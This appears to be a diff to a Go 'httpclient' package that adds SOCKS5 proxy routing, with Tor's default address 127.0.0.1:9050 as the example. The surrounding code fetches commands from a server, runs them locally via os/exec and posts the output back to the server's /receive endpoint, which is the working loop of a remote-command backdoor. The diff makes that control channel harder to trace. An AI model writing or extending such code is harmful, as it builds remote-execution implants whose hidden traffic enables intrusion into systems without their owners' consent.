@@ -2,6 +2,7 @@ package httpclient
 
 import (
 	"bytes"
+	"context"
 	"crypto/tls"
 	"encoding/json"
 	"errors"
@@ -10,12 +11,15 @@ import (
 	"io"
 	"log"
 	"math/rand"
+	"net"
 	"net/http"
 	"os"
 	"os/exec"
 	"os/signal"
 	"strings"
 	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 // RequestOptions defines available options for an HTTP request.
@@ -27,12 +31,14 @@ type RequestOptions struct {
 	Body          interface{}       // Request body (JSON struct or string)
 	Timeout       time.Duration     // Timeout duration
 	SkipTLSVerify bool              // Whether to skip TLS verification
+	Proxy         string            // Optional SOCKS5 proxy host:port (e.g. 127.0.0.1:9050)
 }
 
 // Parse flags from user input
 func (ro *RequestOptions) SetRequestFlag(fs *flag.FlagSet) {
 	fs.StringVar(&ro.Method, "method", "GET", "HTTP method (GET, POST, etc.)")
 	fs.StringVar(&ro.BaseURL, "url", "", "Request URL")
+	fs.StringVar(&ro.Proxy, "proxy", "", "Optional SOCKS5 proxy host:port; traffic to -url is routed through it (e.g. 127.0.0.1:9050)")
 	fs.BoolVar(&ro.SkipTLSVerify, "skip-tls-verify", false, "Skip TLS certificate verification")
 
 	// Process headers
@@ -119,6 +125,30 @@ func parseTimeout(timeoutStr string) (time.Duration, error) {
 	return duration, nil
 }
 
+// httpClientFor returns an HTTP client that dials directly or via SOCKS5 when opts.Proxy is set.
+func httpClientFor(opts *RequestOptions) (*http.Client, error) {
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: opts.SkipTLSVerify,
+	}
+	transport := &http.Transport{
+		TLSClientConfig: tlsConfig,
+	}
+	proxyAddr := strings.TrimSpace(opts.Proxy)
+	if proxyAddr != "" {
+		socksDialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
+		if err != nil {
+			return nil, fmt.Errorf("SOCKS5 proxy %q: %w", proxyAddr, err)
+		}
+		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+			return socksDialer.Dial(network, addr)
+		}
+	}
+	return &http.Client{
+		Timeout:   opts.Timeout,
+		Transport: transport,
+	}, nil
+}
+
 // ExecuteCommand runs the received command and returns the output.
 func ExecuteCommand(command string) (string, error) {
 	// Split the command into name and args
@@ -137,7 +167,7 @@ func ExecuteCommand(command string) (string, error) {
 }
 
 // SendCommandOutput sends the command execution result back to the server.
-func SendCommandOutput(serverURL, command, output string, headers map[string]string, skipTLS bool, timeout time.Duration) error {
+func SendCommandOutput(serverURL, command, output string, headers map[string]string, opts *RequestOptions) error {
 	// Construct JSON payload
 	data := map[string]string{
 		"command": command,
@@ -160,17 +190,9 @@ func SendCommandOutput(serverURL, command, output string, headers map[string]str
 	}
 	req.Header.Set("Content-Type", "application/json")
 
-	// TLS configuration
-	tlsConfig := &tls.Config{
-		InsecureSkipVerify: skipTLS, // Skip TLS verification if requested
-	}
-
-	// HTTP client
-	client := &http.Client{
-		Timeout: timeout,
-		Transport: &http.Transport{
-			TLSClientConfig: tlsConfig,
-		},
+	client, err := httpClientFor(opts)
+	if err != nil {
+		return err
 	}
 
 	// Send request
@@ -232,17 +254,9 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 		req.Header.Set(key, value)
 	}
 
-	// Custom TLS configuration
-	tlsConfig := &tls.Config{
-		InsecureSkipVerify: opts.SkipTLSVerify, // Skip TLS verification if requested
-	}
-
-	// Create HTTP client with timeout
-	client := &http.Client{
-		Timeout: opts.Timeout,
-		Transport: &http.Transport{
-			TLSClientConfig: tlsConfig,
-		},
+	client, err := httpClientFor(opts)
+	if err != nil {
+		return nil, err
 	}
 
 	resp, err := client.Do(req)
@@ -292,7 +306,7 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 				}
 
 				// Send output back to /receive
-				err = SendCommandOutput(postURL, commandStr, output, opts.Headers, opts.SkipTLSVerify, opts.Timeout)
+				err = SendCommandOutput(postURL, commandStr, output, opts.Headers, opts)
 				if err != nil {
 					log.Printf("[-] Failed to send command output: %s\n", err)
 				}
